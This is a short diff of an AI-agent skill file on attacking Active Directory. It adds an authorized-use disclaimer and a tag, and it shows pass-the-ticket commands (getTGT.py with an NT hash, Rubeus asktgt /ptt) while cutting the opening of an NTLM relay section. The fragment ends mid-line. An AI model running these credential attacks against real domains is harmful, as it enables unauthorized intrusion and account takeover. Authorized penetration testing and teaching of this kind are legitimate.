@@ -3,10 +3,12 @@ name: active-directory-attacks
 description: Provide comprehensive techniques for attacking Microsoft Active Directory environments. Covers reconnaissance, credential harvesting, Kerberos attacks, lateral movement, privilege escalation, and doma
 category: Security & Systems
 source: antigravity
-tags: [python, ai, llm, workflow, template, document, vulnerability, cro]
+tags: [python, ai, llm, workflow, template, document, security, vulnerability, cro]
 url: https://github.com/sickn33/antigravity-awesome-skills/tree/main/skills/active-directory-attacks
 ---
 
+
+> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # Active Directory Attacks
 
@@ -216,14 +218,4 @@ getTGT.py domain.local/user -hashes :NTHASH
 export KRB5CCNAME=user.ccache
 
 # Rubeus
-.\Rubeus.exe asktgt /user:user /rc4:NTHASH /ptt
-```
-
----
-
-## NTLM Relay Attacks
-
-### Responder + ntlmrelayx
-
-```bash
-# Start Responder (disable SMB/H
+.\Rube
